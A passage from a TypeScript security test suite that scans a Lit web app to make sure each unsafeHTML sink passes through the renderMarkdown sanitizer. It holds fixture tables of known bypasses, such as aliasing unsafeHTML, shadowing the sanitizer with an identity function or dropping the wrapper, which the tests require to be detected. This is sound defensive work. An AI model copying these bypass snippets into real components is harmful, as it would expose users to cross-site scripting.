  { name: 'lit unsafeStatic directive', pattern: /unsafeStatic\s*\(/ },
];

/**
 * The identifiers each REQUIRED_SINKS file is allowed to use, and the one module
 * each may come from. Module paths are suffix-matched, as in RAW_DIRECTIVES.
 */
const SINK_BINDINGS = [
  { name: 'unsafeHTML', from: 'directives/unsafe-html.js', label: "lit's unsafe-html directive module" },
  { name: 'renderMarkdown', from: 'util/markdown.js', label: 'the sanitizer module' },
];

/**
 * MECHANISM (a): the closed-world half, stated as rules about how the two
 * identifiers may be USED rather than as a list of spellings to ban.
 *
 * Every previous round closed the *named form* of the previous round's finding
 * and was evaded by the next spelling one week later:
 *
 *   round 1  `unsafeHTML(c.body)`            -> banned the literal call shape
 *   round 2  `import { unsafeHTML as raw }`  -> banned `as`-aliasing
 *   round 3  `const raw = unsafeHTML`        -> value alias, no `as` at all
 *   round 3  `const renderMarkdown = s => s` -> identity shadow of the sanitizer
 *
 * A list of forms cannot terminate. These four rules can, because they are
 * positive and closed over an enumerated set of two files:
 *
 *   R1  the sanitized sink text `unsafeHTML(renderMarkdown(` is present;
 *   R2  each identifier is imported UNALIASED from the one module allowed to
 *       provide it, by a value import (not `import type`);
 *   R3  neither identifier is re-bound by a local const/let/var/function/class;
 *   R4  outside its import statement, neither identifier may appear in ANY
 *       position other than immediately called — `name(`.
 *
 * R4 is the rule that generalises, and it is why this is not round 5's problem.
 * `const raw = unsafeHTML`, `const S = { raw: unsafeHTML }`, `const { unsafeHTML:
 * raw } = await import(…)`, `unsafeHTML as unknown as F`, `export { unsafeHTML }`,
 * and a *parameter* named `renderMarkdown` shadowing the module import are all
 * the same violation of R4, and not one of them had to be foreseen to be caught.
 * R3 is strictly redundant against R4 and is kept only because it names the
 * mistake in the failure message. R2 is what closes the "helper moved to
 * util/format.ts" refactor, which introduces no new file and no new binding.
 *
 * Note R4 subsumes the sibling question "is the directive imported at all": a
 * file that drops the import and defines its own `unsafeHTML` fails R2 and R3.
 *
 * Takes RAW file text and derives its own views, because the rules need two:
 * R2 must see string literals (a module specifier is one), while R3 and R4 must
 * not (a message or a fixture string may legitimately name the identifier).
 * There is deliberately NO ignore-line opt-out: disarming the sound half must
 * require editing this file, where a reviewer sees it, not adding a comment to a
 * component.
 */
function sinkBindingViolations(rel: string, src: string): string[] {
  const bad: string[] = [];
  const withStrings = stripInertText(src, { strings: false });
  const code = stripInertText(src, { strings: true });

  // R1
  if (!/unsafeHTML\s*\(\s*renderMarkdown\s*\(/.test(code)) {
    bad.push(`${rel}: no longer contains unsafeHTML(renderMarkdown( — the sanitizer wrapper is gone`);
  }

  const clauses = [
    ...withStrings.matchAll(/\bimport\s*(type\s+)?\{([^}]*)\}\s*from\s*['"]([^'"]+)['"]/g),
  ];
  const outside = stripImportStatements(code);

  for (const { name, from, label } of SINK_BINDINGS) {
    // R2
    const bound = clauses.some(
      ([, typeOnly, clause, spec]) =>
        !typeOnly &&
        spec.endsWith(from) &&
        new RegExp(`(?:^|,)\\s*${name}\\s*(?:,|$)`).test(clause),
    );
    if (!bound) {
      bad.push(
        `${rel}: does not import ${name} unaliased from ${label} (a specifier ending '${from}') — ` +
          'the name may therefore resolve to something other than the audited one',
      );
    }

    // R3
    const rebindLines = matchLines(outside, new RegExp(`\\b(?:const|let|var|function|class)\\s+${name}\\b`));
    if (rebindLines.length > 0) {
      bad.push(
        `${rel}:${rebindLines.join(',')}: re-binds ${name} locally — this shadows the import and ` +
          'silently unwraps the sink while leaving the sink text byte-identical',
      );
    }

    // R4
    const nonCallLines = matchLines(outside, new RegExp(`\\b${name}\\b(?!\\s*\\()`));
    if (nonCallLines.length > 0) {
      bad.push(
        `${rel}:${nonCallLines.join(',')}: ${name} appears in a non-called position — ` +
          `outside its import statement the only permitted use is an immediate call \`${name}(\`. ` +
          'Aliasing, destructuring-rename, a property bag, an `as` cast or a parameter of the ' +
          'same name all reach the sink under a name no scan in this file can follow.',
      );
    }
  }

  return bad;
}

/**
 * MECHANISM (b): the tree-wide indirection tripwire.
 *
 * Input must be `stripInertText(stripIgnoredLines(src), { strings: false })` —
 * string contents are KEPT because the module specifier being matched is itself
 * a string literal.
 */
function directiveIndirectionOffenders(rel: string, code: string): string[] {
  const offenders: string[] = [];
  const outside = stripImportStatements(code);

  for (const { name, module } of RAW_DIRECTIVES) {
    const mod = module.replace(/\./g, '\\.');

    // Anchored to an import/export brace clause. Unanchored, `\bNAME\s+as\s+`
    // also fired on `const d = unsafeHTML as unknown as F` (which R4/the
    // non-call rule below now reports properly) and on any comment containing
    // the words "unsafeHTML as".
    if (new RegExp(`(?:import|export)\\s*(?:type\\s+)?\\{[^}]*\\b${name}\\s+as\\s+`).test(code)) {
      offenders.push(`${rel}: ${name} renamed with 'as' in an import/export clause`);
    }

    if (new RegExp(`import\\s*\\*\\s*as\\s+\\w+\\s+from\\s*['"][^'"]*${mod}['"]`).test(code)) {
      offenders.push(`${rel}: ${module} imported as a namespace`);
    }

    // Re-export: flag only when the banned NAME crosses the boundary, or when
    // `export *` carries it implicitly. Matching on the module path alone
    // rejected `export { html as staticHtml } from 'lit/static-html.js'`, which
    // re-exports a safe symbol. `[^}\n]` / `[^;\n]` keep the clause inside one
    // statement: `[^;]` matches newlines, so an adjacent semicolon-less line
    // used to be swept in.
    const reexport = new RegExp(`export\\s*(\\*|\\{[^}\\n]*\\})[^;\\n]*from\\s*['"][^'"]*${mod}['"]`);
    const m = reexport.exec(code);
    if (m && (m[1] === '*' || new RegExp(`\\b${name}\\b`).test(m[1]))) {
      offenders.push(`${rel}: ${module} re-exports ${name}`);
    }

    // Value aliasing needs no keyword at all, so it cannot be caught by adding
    // a fourth import-syntax form. Stated as a usage rule instead: outside its
    // import statement the directive may only appear immediately called. This
    // is the same rule as R4 in sinkBindingViolations, applied tree-wide, and
    // it is the one that covers `const raw = unsafeHTML`, `{ raw: unsafeHTML }`
    // and `const { unsafeHTML: raw } = await import(…)` without naming them.
    for (const line of matchLines(outside, new RegExp(`\\b${name}\\b(?!\\s*\\()`))) {
      offenders.push(`${rel}:${line}: ${name} used in a non-called position`);
    }
  }

  return offenders;
}

function sinkBinding(): void {
  const root = findWebRoot();
  const files: string[] = [];
  collectSourceFiles(join(root, 'src'), files);

  check('sink scan actually reads the source tree', () => {
    if (files.length !== EXPECTED_SOURCE_FILES) {
      throw new Error(
        `expected to scan exactly ${EXPECTED_SOURCE_FILES} source files, found ${files.length} — ` +
          'before changing this number, open the added or removed file(s) and confirm none of ' +
          'them introduces a raw-HTML sink or a raw Lit directive under another name. ' +
          'Adding a file is normally fine and updating the count is normally the right ' +
          'action — but that confirmation is the decision this pin exists to force, and it is ' +
          'the only thing standing between the tree and a raw sink in a brand-new file. ' +
          'Never change it merely to make a red suite go green.',
      );
    }
  });

  // MECHANISM (a). Each required sink is read by explicit path, so a file that is
  // renamed, deleted, or rewritten into a form the tree-wide regexes no longer
  // match fails here instead of quietly leaving their results. See
  // sinkBindingViolations for the four rules and why they are rules rather than
  // a list of banned spellings.
  for (const rel of REQUIRED_SINKS) {
    check(`${rel} binds its markdown sink to the sanitizer`, () => {
      const src = readFileSync(join(root, rel), 'utf8');
      const violations = sinkBindingViolations(rel, src);
      if (violations.length > 0) {
        throw new Error(`sink binding broken:\n      ${violations.join('\n      ')}`);
      }
    });
  }

  // Comment-stripped view of every scanned file, computed once. `strings: false`
  // keeps module specifiers and quoted property keys intact for the tree-wide
  // patterns that need them.
  const scanned = files.map((file) => ({
    rel: relative(root, file),
    code: stripInertText(stripIgnoredLines(readFileSync(file, 'utf8')), { strings: false }),
  }));

  const sinks: { file: string; arg: string }[] = [];
  for (const { rel, code } of scanned) {
    for (const m of code.matchAll(/unsafeHTML\s*\(\s*([A-Za-z0-9_$.]*)/g)) {
      sinks.push({ file: rel, arg: m[1] ?? '' });
    }
  }

  // Pinned exactly, not as a floor. The old `>= 2` floor sat exactly on the true
  // count, so it caught a disappearing sink only by coincidence — restore the
  // count with a duplicate elsewhere and the same regression goes green again.
  // Update alongside REQUIRED_SINKS when a legitimate sink is added or removed.
  check('unsafeHTML call sites are still found', () => {
    if (sinks.length !== REQUIRED_SINKS.length) {
      throw new Error(
        `expected exactly ${REQUIRED_SINKS.length} unsafeHTML call sites, found ${sinks.length} — ` +
          'update REQUIRED_SINKS deliberately if a sink was added or removed',
      );
    }
  });

  // MECHANISM (b), tripwire. Indirection defeats every name-based scan in this
  // function: rename the directive and the sink disappears from the case lists
  // rather than failing either. See directiveIndirectionOffenders.
  check('tripwire: no file reaches a raw-HTML directive under another name', () => {
    const offenders: string[] = [];
    for (const { rel, code } of scanned) {
      offenders.push(...directiveIndirectionOffenders(rel, code));
    }
    if (offenders.length > 0) {
      throw new Error(
        'raw-HTML directive obscured by indirection: ' +
          offenders.join(', ') +
          ' [tripwire: catches the listed indirection forms only, not all of them]',
      );
    }
  });

  check('every unsafeHTML call site passes renderMarkdown', () => {
    const unbound = sinks.filter((s) => s.arg !== 'renderMarkdown');
    if (unbound.length > 0) {
      throw new Error(
        'unsanitized unsafeHTML sink(s): ' +
          unbound.map((s) => `${s.file} -> unsafeHTML(${s.arg}`).join(', '),
      );
    }
  });

  // unsafeHTML is not the only way to reach the DOM with a raw string; a new
  // innerHTML sink would bypass renderMarkdown without touching the checks
  // above. See BANNED_SINKS for the scope and — importantly — the limits.
  check('tripwire: no listed raw-HTML sink other than unsafeHTML is present', () => {
    const offenders: string[] = [];
    for (const { rel, code } of scanned) {
      for (const { name, pattern } of BANNED_SINKS) {
        if (pattern.test(code)) {
          offenders.push(`${rel} (${name})`);
        }
      }
    }
    if (offenders.length > 0) {
      throw new Error(
        `raw-HTML sink outside renderMarkdown in: ${offenders.join(', ')} ` +
          '[tripwire: an enumeration of known sinks, not a proof of absence]',
      );
    }
  });

  // ---------------------------------------------------------------------------
  // Fixtures for the rules themselves.
  //
  // Everything above is asserted against the tree, so it only exercises the
  // shapes the tree happens to contain. The `lit/static-html.js` false-positive
  // control that previous rounds cited as deliberate passed VACUOUSLY: no file
  // in the repo imports it, so nothing ran. Adding production code to create a
  // control would be worse. These tables exercise the rules directly, and sit
  // under the same EXPECTED_CHECKS pin as everything else.
  //
  // The positive tables are the regression test for this round specifically:
  // every evasion found by review rounds 1-3 is listed, so a future
  // simplification of the rules cannot quietly reopen one.
  // ---------------------------------------------------------------------------

  const LEGITIMATE_SOURCE = [
    "import { html } from 'lit/static-html.js';",
    "import { html, literal } from 'lit/static-html.js';",
    "export { html as staticHtml } from 'lit/static-html.js';",
    "import { unsafeHTML } from 'lit/directives/unsafe-html.js';",
    'const t = html`${unsafeHTML(renderMarkdown(this.body))}`;',
    'const parsed = value as unknown as string;',
    'const node = document.createElement("div");',
    'el.textContent = body;',
    'if (el.innerHTML === previous) return;',
  ];

  check('fixture: legitimate source does not trip the raw-directive tripwire', () => {
    const offenders: string[] = [];
    for (const fixture of LEGITIMATE_SOURCE) {
      const code = stripInertText(stripIgnoredLines(fixture), { strings: false });
      offenders.push(...directiveIndirectionOffenders('<fixture>', code).map((o) => `${o} :: ${fixture}`));
      for (const { name, pattern } of BANNED_SINKS) {
        if (pattern.test(code)) offenders.push(`${name} :: ${fixture}`);
      }
    }
    if (offenders.length > 0) {
      throw new Error(`the guard rejects legitimate source: ${offenders.join(' | ')}`);
    }
  });

  const INERT_PROSE = [
    '// SECURITY: never import unsafeHTML as something else - it defeats the scan.',
    '// Do not use document.write( here; use lit templating.',
    '/* renderMarkdown must wrap every unsafeHTML call. */',
    'const t = html`<!-- renderMarkdown, not unsafeHTML, is the boundary. -->${x}`;',
    "const ADVICE = 'never do el.innerHTML = userInput'; // raw-sink-scan: ignore-line",
  ];

  check('fixture: comments and marked lines cannot turn the suite red', () => {
    const offenders: string[] = [];
    for (const fixture of INERT_PROSE) {
      const code = stripInertText(stripIgnoredLines(fixture), { strings: false });
      offenders.push(...directiveIndirectionOffenders('<fixture>', code).map((o) => `${o} :: ${fixture}`));
      for (const { name, pattern } of BANNED_SINKS) {
        if (pattern.test(code)) offenders.push(`${name} :: ${fixture}`);
      }
    }
    if (offenders.length > 0) {
      throw new Error(`the guard rejects prose about itself: ${offenders.join(' | ')}`);
    }
  });

  const INDIRECTION_EVASIONS = [
    "import { unsafeHTML as raw } from 'lit/directives/unsafe-html.js';",
    "import { unsafeHTML as raw } from 'lit-html/development/directives/unsafe-html.js';",
    "import { unsafeSVG as raw } from 'lit/directives/unsafe-svg.js';",
    "import { unsafeStatic as raw } from 'lit/static-html.js';",
    "import * as d from 'lit/directives/unsafe-html.js';",
    "export { unsafeHTML } from 'lit/directives/unsafe-html.js';",
    "export * from 'lit/directives/unsafe-html.js';",
    'const raw = unsafeHTML;',
    'const S = { raw: unsafeHTML };',
    "const { unsafeHTML: raw } = await import('lit/directives/unsafe-html.js');",
    'const d = unsafeHTML as unknown as (s: string) => unknown;',
    'const raw = unsafeHTML\n;',
    'callIt(unsafeHTML);',
  ];

  check('fixture: every known indirection form is caught by the tripwire', () => {
    const missed: string[] = [];
    for (const fixture of INDIRECTION_EVASIONS) {
      const code = stripInertText(stripIgnoredLines(fixture), { strings: false });
      if (directiveIndirectionOffenders('<fixture>', code).length === 0) missed.push(fixture);
    }
    if (missed.length > 0) {
      throw new Error(`indirection form no longer detected: ${missed.join(' | ')}`);
    }
  });

  // A minimal file that satisfies all four rules, used as the base for the
  // mutation table below. It deliberately contains the HTML comment and the
  // security comment that used to turn the suite red.
  const SOUND_SINK_FILE = [
    "import { LitElement, html } from 'lit';",
    "import { unsafeHTML } from 'lit/directives/unsafe-html.js';",
    "import { renderMarkdown } from '../../util/markdown.js';",
    '// SECURITY: never alias unsafeHTML, and never shadow renderMarkdown.',
    'export class C extends LitElement {',
    '  render() {',
    '    return html`',
    '      <!-- renderMarkdown sanitizes with DOMPurify before this HTML is injected. -->',
    '      ${unsafeHTML(renderMarkdown(this.body))}',
    '    `;',
    '  }',
    '}',
  ].join('\n');

  check('fixture: the sink-binding rules accept a correct sink file', () => {
    const violations = sinkBindingViolations('<fixture>', SOUND_SINK_FILE);
    if (violations.length > 0) {
      throw new Error(`the sound fixture was rejected: ${violations.join(' | ')}`);
    }
  });

  // Each entry replaces `find` with `replace` in SOUND_SINK_FILE and must yield
  // at least one violation. Every one of these was a live bypass in some round.
  const SINK_EVASIONS: { label: string; find: string; replace: string }[] = [
    {
      label: 'V1 identity shadow, sanitizer import kept under an alias',
      find: "import { renderMarkdown } from '../../util/markdown.js';",
      replace:
        "import { renderMarkdown as _rmUnused } from '../../util/markdown.js';\n" +
        'const renderMarkdown = (s: string): string => s;',
    },
    {
      label: 'V1b sanitizer import removed entirely',
      find: "import { renderMarkdown } from '../../util/markdown.js';",
      replace: 'const renderMarkdown = (s: string): string => s;',
    },
    {
      label: 'V1c sanitizer re-homed onto another module (no new file)',
      find: "import { renderMarkdown } from '../../util/markdown.js';",
      replace: "import { renderMarkdown } from '../../util/format.js';",
    },
    {
      label: 'V1d sanitizer shadowed by a parameter, not a declaration',
      find: '  render() {',
      replace: '  render(renderMarkdown: (s: string) => string) {',
    },
    {
      label: 'V1e sanitizer aliased by assignment and called under the alias',
      find: '      ${unsafeHTML(renderMarkdown(this.body))}',
      replace: '      ${unsafeHTML(rm(this.body))}',
    },
    {
      label: 'V2 unsafeHTML renamed in the import clause',
      find: "import { unsafeHTML } from 'lit/directives/unsafe-html.js';",
      replace: "import { unsafeHTML as raw } from 'lit/directives/unsafe-html.js';",
    },
    {
      label: 'V3 unsafeHTML value-aliased beside the untouched real sink',
      find: 'export class C extends LitElement {',
      replace: 'const rawHtml = unsafeHTML;\nexport class C extends LitElement {',
    },
    {
      label: 'V3b unsafeHTML in a property bag',
      find: 'export class C extends LitElement {',
      replace: 'const S = { raw: unsafeHTML };\nexport class C extends LitElement {',
    },
    {
      label: 'V3c unsafeHTML destructure-renamed off a dynamic import',
      find: 'export class C extends LitElement {',
      replace:
        "const { unsafeHTML: raw } = await import('lit/directives/unsafe-html.js');\n" +
        'export class C extends LitElement {',
    },
    {
      label: 'V3d unsafeHTML laundered through an `as` cast',
      find: 'export class C extends LitElement {',
      replace:
        'const raw = unsafeHTML as unknown as (s: string) => unknown;\n' +
        'export class C extends LitElement {',
    },
    {
      label: 'V3e unsafeHTML re-exported out of the sink file',
      find: 'export class C extends LitElement {',
      replace: 'export { unsafeHTML };\nexport class C extends LitElement {',
    },
    {
      label: 'V4 sanitizer wrapper dropped at the sink',
      find: '${unsafeHTML(renderMarkdown(this.body))}',
      replace: '${unsafeHTML(this.body)}',
    },
    {
      label: 'V5 sanitizer imported as a type only',
      find: "import { renderMarkdown } from '../../util/markdown.js';",
      replace: "import type { renderMarkdown } from '../../util/markdown.js';",
    },
  ];

  check('fixture: every known sink-binding evasion is caught', () => {
    const survived: string[] = [];
    for (const { label, find, replace } of SINK_EVASIONS) {
      const occurrences = SOUND_SINK_FILE.split(find).length - 1;
      if (occurrences !== 1) {
        survived.push(`${label}: fixture anchor matched ${occurrences} times, expected 1`);
        continue;
      }
      const mutated = SOUND_SINK_FILE.replace(find, replace);
      if (sinkBindingViolations('<fixture>', mutated).length === 0) {
        survived.push(label);
      }
    }
    if (survived.length > 0) {
      throw new Error(`sink-binding evasion no longer caught: ${survived.join(' | ')}`);
    }
  });
}

// A check that is deleted — or that stops being reached, or whose case list is
// built by filtering through the very predicate under test — does not fail. It
// ceases to exist, and the suite still prints a green count one lower than
// before. Every mutation count this suite reports is only as trustworthy as its
// total, so the total is pinned. Update this deliberately when adding or
// removing a check; never to make a red suite go green.
//
// Note for anyone cross-checking this by grep: static and runtime counts no
// longer agree, and that is expected. There are 58 literal call sites
// (`grep -cE '^\s+check\('`) but 59 checks at runtime, because the REQUIRED_SINKS
// checks are emitted from a loop — one call site, one check per required sink.
// The runtime count is the authoritative one and is what the pin below compares
// against. Keep this arithmetic up to date: 58 + (REQUIRED_SINKS.length - 1) = 59.
//
// Moved 54 -> 59 in the round-4 cleanup: five `check()` calls were added, all of
// them the `fixture:` ones in sinkBinding(). They assert the guard's own rules
// against string tables rather than against the tree, so the false-positive
// control and every historical bypass are exercised on every run instead of
// only when the tree happens to contain the shape. No behavioural check was
// removed; the two REQUIRED_SINKS checks were rewritten in place, not added to.
const EXPECTED_CHECKS = 59;

function run(): void {
  formControls();
  spoofingAttributes();
  scriptExecution();
  svgSurface();
  ordinaryMarkdown();
  taskLists();
  sinkBinding();

  if (checks !== EXPECTED_CHECKS) {
    failures.push(
      `check total pinned: expected ${EXPECTED_CHECKS} checks to run, ${checks} did — ` +
        'a check was added or silently removed',
    );
  }

  if (failures.length > 0) {
    throw new Error(
      `${failures.length} of ${checks} markdown sanitizer checks failed:\n` +
        failures.map((f) => `  - ${f}`).join('\n'),
    );
  }
  console.log(`markdown sanitizer: ${checks} checks passed`);
}

run();
